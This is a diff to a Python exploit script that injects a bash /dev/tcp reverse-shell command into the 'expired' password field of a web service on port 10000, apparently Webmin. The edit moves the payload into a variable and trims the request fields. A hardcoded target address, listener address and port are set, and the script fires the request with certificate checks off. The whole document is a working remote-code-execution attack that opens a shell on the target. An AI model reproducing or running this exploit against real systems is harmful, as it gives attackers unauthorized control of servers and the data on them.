@@ -10,11 +10,10 @@ def exploit(target, lhost, lport):
         'Referer': f'https://{target}:10000/',
         'Content-Type': 'application/x-www-form-urlencoded'
     }
+    payload = f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'"
     data = {
-        'expired': f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'",
-        'new1': 'SmKUYgMFtixFlLt6nggby',
-        'new2': 'SmKUYgMFtixFlLt6nggby',
-        'old': f"bash -c '0<&66-;exec 66<>/dev/tcp/{lhost}/{lport};sh <&66 >&66 2>&66'"
+        'expired': payload,
+        'new1': 'SmKUYgMFtixFlLt6nggby'
     }
     requests.post(exploit_target, headers=headers, data=data, verify=False)
     print("Exploit script executed successfully.")
@@ -24,4 +23,5 @@ def exploit(target, lhost, lport):
 target = "192.168.1.14"
 lhost = "192.168.1.72"
 lport = "4443"
+
 exploit(target, lhost, lport)
